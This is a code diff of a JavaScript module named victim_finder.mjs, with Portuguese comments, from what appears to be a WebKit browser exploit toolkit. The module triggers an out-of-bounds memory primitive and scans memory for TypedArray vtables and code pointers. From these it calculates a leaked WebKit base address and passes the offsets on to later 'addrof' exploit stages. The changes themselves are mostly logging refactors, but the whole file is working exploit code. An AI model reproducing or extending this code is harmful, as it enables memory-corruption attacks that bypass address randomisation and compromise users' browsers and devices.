@@ -1,6 +1,7 @@
 // js/victim_finder.mjs
 import { AdvancedInt64 } from './int64.mjs';
-import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
+// CORREÇÃO: Importar 'log' como 'appLog' para consistência
+import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
 import * as Core from './core_exploit.mjs';
 import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';
 
@@ -20,28 +21,29 @@ export function setLeakedWebKitBaseAddress(baseAddrHex) {
     if (!baseAddrHex) {
         leakedWebKitBaseAddress = null;
         KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
-        log(`Endereço base da WebKit LIMPO.`, "info", FNAME_SET_BASE);
+        appLog(`Endereço base da WebKit LIMPO.`, "info", FNAME_SET_BASE); // Usa appLog
         return;
     }
     try {
         leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
-        log(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_SET_BASE);
+        appLog(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_SET_BASE); // Usa appLog
         
         KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets || []).map(offsetHex =>
             leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(offsetHex))
         );
         if (KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0) {
-            log(`VTables Absolutas Calculadas: ${KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.map(a => a.toString(true)).join(', ')}`, 'info', FNAME_SET_BASE);
+            appLog(`VTables Absolutas Calculadas: ${KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.map(a => a.toString(true)).join(', ')}`, 'info', FNAME_SET_BASE); // Usa appLog
         } else {
-            log(`Nenhum offset de VTable conhecido em WEBKIT_LIBRARY_INFO para calcular endereços absolutos.`, 'warn', FNAME_SET_BASE);
+            appLog(`Nenhum offset de VTable conhecido em WEBKIT_LIBRARY_INFO para calcular endereços absolutos.`, 'warn', FNAME_SET_BASE); // Usa appLog
         }
     } catch (e) {
-        log(`Erro ao definir endereço base da WebKit: ${e.message}`, "error", FNAME_SET_BASE);
+        appLog(`Erro ao definir endereço base da WebKit: ${e.message}`, "error", FNAME_SET_BASE); // Usa appLog
         leakedWebKitBaseAddress = null;
         KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
     }
 }
 
+// logFn aqui será appLog passado de scanMemory
 async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
@@ -96,6 +98,7 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     return null;
 }
 
+// logFn aqui será appLog passado de scanMemory
 async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
     try {
         const potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
@@ -127,7 +130,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                 for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                     const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                     const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
-                    if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) {
+                    if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) { // Exemplo de checagem de base
                         return {
                             type: "CodePointer (Base Calculated)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                             leakedPtrHex: potentialPtr.toString(true), calculatedBaseHex: potentialBaseAddr.toString(true),
@@ -143,24 +146,25 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
 
 export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes = 8, scanConfig = {typedArrays: true, codePointers: false}) {
     const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
-    log(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
+    // CORREÇÃO: Usar appLog consistentemente para os logs da UI deste módulo.
+    appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
     updateOOBConfigFromUI(); 
     
     if (!Core.oob_array_buffer_real || 
         OOB_CONFIG.ALLOCATION_SIZE !== Core.oob_dataview_real?.byteLength || 
         OOB_CONFIG.BASE_OFFSET_IN_DV !== Core.oob_dataview_real?.byteOffset) {
-        log("   Configurações OOB ou buffer OOB parecem desatualizados/não ativos. Reativando primitiva OOB...", 'warn', FNAME_SCAN);
+        appLog("   Configurações OOB ou buffer OOB parecem desatualizados/não ativos. Reativando primitiva OOB...", 'warn', FNAME_SCAN);
         await Core.triggerOOB_primitive(); 
         if (!Core.oob_array_buffer_real) {
-            log("   ERRO: Primitiva OOB não pôde ser ativada/reativada. Varredura abortada.", 'error', FNAME_SCAN);
+            appLog("   ERRO: Primitiva OOB não pôde ser ativada/reativada. Varredura abortada.", 'error', FNAME_SCAN);
             return [];
         }
     }
     
-    log(`   Usando Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, 'info', FNAME_SCAN);
-    log(`   Buffer OOB Real Total: ${Core.oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_SCAN);
-    log(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);
-    log(`   Tipos de Scan Ativos: TypedArrays=${scanConfig.typedArrays}, CodePointers=${scanConfig.codePointers}`, 'info', FNAME_SCAN);
+    appLog(`   Usando Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, 'info', FNAME_SCAN);
+    appLog(`   Buffer OOB Real Total: ${Core.oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_SCAN);
+    appLog(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);
+    appLog(`   Tipos de Scan Ativos: TypedArrays=${scanConfig.typedArrays}, CodePointers=${scanConfig.codePointers}`, 'info', FNAME_SCAN);
 
     const candidates = [];
     const maxRelativeOffsetToScanUpTo = scanStartRelOffset + scanRangeBytes;
@@ -176,34 +180,43 @@ export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes =
 
     for (let currentCandidateBaseRelOffset = scanStartRelOffset; currentCandidateBaseRelOffset < maxRelativeOffsetToScanUpTo; currentCandidateBaseRelOffset += stepBytes) {
         if (currentCandidateBaseRelOffset > safeBaseCandidateLimitRelative) {
-            log(`   AVISO: Base candidata ${toHexS1(currentCandidateBaseRelOffset)} excedeu limite seguro de leitura ${toHexS1(safeBaseCandidateLimitRelative)}. Parando varredura.`, 'warn', FNAME_SCAN);
+            appLog(`   AVISO: Base candidata ${toHexS1(currentCandidateBaseRelOffset)} excedeu limite seguro de leitura ${toHexS1(safeBaseCandidateLimitRelative)}. Parando varredura.`, 'warn', FNAME_SCAN);
             break;
         }
-        if (document.hidden) { log("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break; }
+        // CORREÇÃO: Usar appLog para consistência, e checar document.hidden como antes
+        if (document.hidden) { appLog("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break; }
         await PAUSE_LAB(1);
 
         let foundThisIteration = null;
         if (scanConfig.typedArrays) {
+            // Passa appLog para as sub-funções de scan
             const taCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, appLog);
             if (taCandidate) {
                 candidates.push(taCandidate);
                 foundThisIteration = taCandidate;
+                // Log do candidato TypedArray específico
+                 if (taCandidate.vtable_match) {
+                     appLog(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable: ${taCandidate.vtable_ptr_hex}`, 'good', FNAME_SCAN);
+                } else {
+                     appLog(`   Candidato TypedArray Encontrado: GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable Lida: ${taCandidate.vtable_ptr_hex}`, 'leak', FNAME_SCAN);
+                }
             }
         }
         if (scanConfig.codePointers && !foundThisIteration) {
             const cpCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, appLog);
             if (cpCandidate) {
                 candidates.push(cpCandidate);
+                appLog(`   CANDIDATO PONTEIRO DE CÓDIGO: OffsetScan ${toHexS1(cpCandidate.gapOrRelativeOffset)}, Ptr: ${cpCandidate.leakedPtrHex}, BaseCalc: ${cpCandidate.calculatedBaseHex} (Função: ${cpCandidate.probableFunction || cpCandidate.knownFunction || cpCandidate.segmentName || 'N/A'})`, 'leak', FNAME_SCAN);
             }
         }
     }
 
     if (candidates.length > 0) {
-        log(`   Varredura concluída. ${candidates.length} candidatos totais encontrados.`, 'good', FNAME_SCAN);
+        appLog(`   Varredura concluída. ${candidates.length} candidatos totais encontrados.`, 'good', FNAME_SCAN);
     } else {
-        log(`   Varredura concluída. Nenhum candidato encontrado com os critérios atuais.`, 'warn', FNAME_SCAN);
+        appLog(`   Varredura concluída. Nenhum candidato encontrado com os critérios atuais.`, 'warn', FNAME_SCAN);
     }
-    log(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
+    appLog(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
     return candidates;
 }
 
@@ -212,12 +225,10 @@ export async function findVictimButtonHandler() {
     const scanRangeEl = document.getElementById('victimFinderScanRange');
     const scanStepEl = document.getElementById('victimFinderScanStep');
     const scanStartOffsetEl = document.getElementById('victimFinderScanStartOffset');
-
+    
+    let scanStartOffset; // Declarada corretamente
     const scanRange = scanRangeEl ? parseInt(scanRangeEl.value, 10) : 30000;
     const scanStep = scanStepEl ? parseInt(scanStepEl.value, 10) : 8;
-    
-    // CORREÇÃO: Declarar e usar 'scanStartOffset' consistentemente
-    let scanStartOffset; 
 
     try {
         const offsetStr = scanStartOffsetEl ? scanStartOffsetEl.value.trim() : "";
@@ -232,14 +243,14 @@ export async function findVictimButtonHandler() {
         if (isNaN(scanStartOffset) || scanStartOffset < 0) {
              scanStartOffset = Core.getInitialBufferSize(); 
              if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
+             appLog(`Offset de início de varredura inválido, usando default: ${toHexS1(scanStartOffset)}`, "warn", FNAME_HANDLER);
         } else {
-            // Garante que o valor na UI seja atualizado para hexadecimal se for um número válido
             if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
         }
     } catch (e) {
         scanStartOffset = Core.getInitialBufferSize(); 
         if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
-        log(`Erro ao parsear offset inicial de varredura: ${e.message}. Usando default ${toHexS1(scanStartOffset)}`, "warn", FNAME_HANDLER);
+        appLog(`Erro ao parsear offset inicial de varredura: ${e.message}. Usando default ${toHexS1(scanStartOffset)}`, "warn", FNAME_HANDLER);
     }
 
     const scanConfig = {
@@ -247,7 +258,6 @@ export async function findVictimButtonHandler() {
         codePointers: true 
     };
 
-    // CORREÇÃO: Passar a variável correta 'scanStartOffset' para scanMemory
     const candidates = await scanMemory(scanStartOffset, scanRange, scanStep, scanConfig);
 
     if (candidates.length > 0) {
@@ -262,7 +272,7 @@ export async function findVictimButtonHandler() {
                 if (c.calculatedBaseHex && !leakedWebKitBaseAddress) {
                     const leakedWebKitBaseHexEl = document.getElementById('leakedWebKitBaseHex');
                     if (leakedWebKitBaseHexEl) leakedWebKitBaseHexEl.value = c.calculatedBaseHex;
-                    setLeakedWebKitBaseAddress(c.calculatedBaseHex);
+                    setLeakedWebKitBaseAddress(c.calculatedBaseHex); // Auto-define a base se encontrada
                 }
             } else {
                 appLog(`  - Candidato Desconhecido: ${JSON.stringify(c)}`, "warn", FNAME_HANDLER);
@@ -274,7 +284,7 @@ export async function findVictimButtonHandler() {
         if (firstTypedArrayCandidate) {
             const firstCandidateGap = firstTypedArrayCandidate.gapOrRelativeOffset;
             if (gapInputEl) {
-                gapInputEl.value = firstCandidateGap; // Mantém decimal para consistência com outros inputs de GAP
+                gapInputEl.value = firstCandidateGap;
                 appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'gap_to_test_input' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
             }
             if (addrofGapEl) {
